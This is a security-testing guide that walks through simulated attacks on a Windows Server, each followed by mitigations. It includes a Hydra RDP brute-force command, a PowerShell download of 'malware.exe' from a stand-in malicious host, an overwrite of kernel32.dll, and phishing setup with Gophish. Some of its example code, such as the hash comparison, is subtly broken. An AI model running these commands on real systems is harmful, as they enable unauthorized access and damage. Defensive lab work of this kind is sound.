### **Simulation 1: Brute-Force Attack on RDP (Remote Desktop Protocol)**

#### **Goal**: Simulate a brute-force attack to test if your server is vulnerable to unauthorized login attempts via RDP.

**Steps**:

1. **Enable RDP** (if not already enabled) on the Windows Server.
   - Ensure that the **Remote Desktop** service is enabled.
   - Open **Control Panel** → **System and Security** → **System** → **Remote Settings** → Ensure "Allow remote connections to this computer" is selected.
   
2. **Test if RDP Port (TCP 3389) is Open**:
   - On your attacking machine (can be a different Windows computer or a virtual machine), check if the RDP port is open on the target server.
   - Run this command using **PowerShell** or **Telnet**:
   ```powershell
   Test-NetConnection -ComputerName <Server-IP> -Port 3389
   ```

3. **Brute-Force with a Tool** (for educational purposes):
   - You can use **Hydra** or **RDPCheck** to perform a brute-force attack. Here's an example of how to use Hydra for this purpose.
   
   **Install Hydra** (on a Kali Linux or similar system):
   ```bash
   sudo apt-get install hydra
   ```

   **Run Hydra to perform the brute-force attack**:
   ```bash
   hydra -l <username> -P <password-list> rdp://<Server-IP>
   ```
   - Replace `<username>` with a valid username on the server and `<password-list>` with a dictionary of commonly used passwords.

   - **Mitigation**: 
     - Once you run the simulation, try to detect and block these types of attacks using **Windows Event Viewer** logs and configure **Account Lockout Policy** to lock accounts after a set number of failed login attempts.
     - **Enable Network Level Authentication (NLA)** for RDP to secure against brute-force attacks.

### **Simulation 2: Privilege Escalation (Misconfigured User Permissions)**

#### **Goal**: Simulate privilege escalation by exploiting a misconfigured user account or weak permissions.

**Steps**:

1. **Create a Low-Privilege User**:
   - Create a new user with limited permissions:
   ```powershell
   New-LocalUser "TestUser" -Password (ConvertTo-SecureString "TestPass123" -AsPlainText -Force)
   Add-LocalGroupMember -Group "Users" -Member "TestUser"
   ```

2. **Test Escalation (Using an Existing Vulnerability)**:
   - If you are testing for privilege escalation, you can attempt to exploit a **misconfigured user permission**.
   
   Example: **Unrestricted access to a vulnerable program** (e.g., running a vulnerable application that allows **DLL hijacking**).

   - **Create a simple script** or **application** that can escalate privileges:
   ```powershell
   Start-Process cmd.exe -Verb runAs
   ```
   This should prompt for admin credentials. If your configuration allows privilege escalation without prompting, this could indicate a misconfiguration.

3. **Check Event Logs for Escalation Attempts**:
   - Open **Event Viewer** and look for security events related to privilege escalation attempts:
   ```powershell
   Get-WinEvent -LogName Security | Where-Object {$_.Message -like "*Privilege Escalation*"}
   ```

   - **Mitigation**:
     - **Review permissions** for low-privilege users regularly.
     - Ensure that **User Account Control (UAC)** is enabled to prevent unauthorized privilege escalation.
     - Regularly audit local group memberships and user permissions.

### **Simulation 3: Unauthorized File Modification (Using SMB)**

#### **Goal**: Simulate unauthorized access to shared files and directories, and test if your file access controls are robust.

**Steps**:

1. **Create a Shared Folder**:
   - Create a shared folder accessible to a specific group or user:
   ```powershell
   New-Item -Path "C:\SharedFolder" -ItemType Directory
   New-SmbShare -Name "SharedFolder" -Path "C:\SharedFolder" -FullAccess "Administrators"
   ```

2. **Test Unauthorized Access (as Non-Admin User)**:
   - Log in to the server as a **low-privilege user**.
   - Try to modify or delete files in the shared folder to see if the permissions are enforced correctly.
   - Use **PowerShell** to try deleting or modifying files:
   ```powershell
   Remove-Item -Path "C:\SharedFolder\ImportantFile.txt"
   ```

   - **Mitigation**:
     - Review and restrict folder permissions using the **Access Control List (ACL)** to ensure that unauthorized users do not have write or delete permissions.
     - Use **File Integrity Monitoring (FIM)** to detect unauthorized file modifications.

### **Simulation 4: File Integrity Monitoring**

#### **Goal**: Simulate a scenario where an attacker modifies important files on your server to show how you can detect such changes using file integrity monitoring.

**Steps**:

1. **Create a Baseline of Critical Files**:
   - For example, track the integrity of system files like `kernel32.dll`:
   ```powershell
   Get-FileHash "C:\Windows\System32\kernel32.dll" | Out-File "C:\FileIntegrityLogs\kernel32_hash.txt"
   ```

2. **Simulate File Tampering**:
   - You can manually modify the file (for example, replace it with a test file):
   ```powershell
   Copy-Item "C:\Windows\System32\test.dll" -Destination "C:\Windows\System32\kernel32.dll" -Force
   ```

3. **Check for Tampering**:
   - Run a script to compare the current hash value with the stored hash value:
   ```powershell
   $currentHash = Get-FileHash "C:\Windows\System32\kernel32.dll"
   $storedHash = Get-Content "C:\FileIntegrityLogs\kernel32_hash.txt"
   
   if ($currentHash.Hash -ne $storedHash) {
       Write-Host "File integrity compromised!"
   } else {
       Write-Host "File integrity intact."
   }
   ```

   - **Mitigation**:
     - Set up **File Integrity Monitoring (FIM)** solutions to alert you when a critical file is modified.
     - Regularly update the hashes for your critical files and have backups in place in case of unauthorized tampering.

### **Simulation 5: Phishing Simulation (User Social Engineering)**

#### **Goal**: Simulate a phishing attempt to test user behavior.

**Steps**:

1. **Create a Test Phishing Email**:
   - Create a fake email that looks legitimate (you can use tools like **Gophish** or **Social Engineering Toolkit** to create phishing campaigns).
   - Ensure that the phishing email asks the user to click on a link to a fake login page or to download an attachment.

2. **Monitor User Response**:
   - You can monitor if users attempt to open the link or attachment.
   - Review email logs for any successful phishing attempts.

3. **Test with PowerShell (download malicious file)**:
   - As an admin, you can test the download of a malicious file that the user might be tricked into downloading:
   ```powershell
   Invoke-WebRequest -Uri "http://malicioussite.com/malware.exe" -OutFile "C:\Users\Public\malware.exe"
   ```

4. **Mitigation**:
   - Use email filtering and **anti-phishing** solutions.
   - Provide users with **security awareness training** to recognize phishing attempts.
   - Enable **multi-factor authentication (MFA)** on all critical accounts to prevent attackers from using stolen credentials.

### Final Notes:
- **Test Environment**: Always perform these simulations in a safe, isolated environment (such as a VM) where no actual damage to production systems will occur.
- **Ethical Considerations**: Make sure that you're authorized to test these attacks and only perform them on systems you own or have explicit permission to test.

These simulations can help you understand the vulnerabilities and provide a deeper understanding of Windows security, so you can take appropriate steps to mitigate real threats in a live environment.
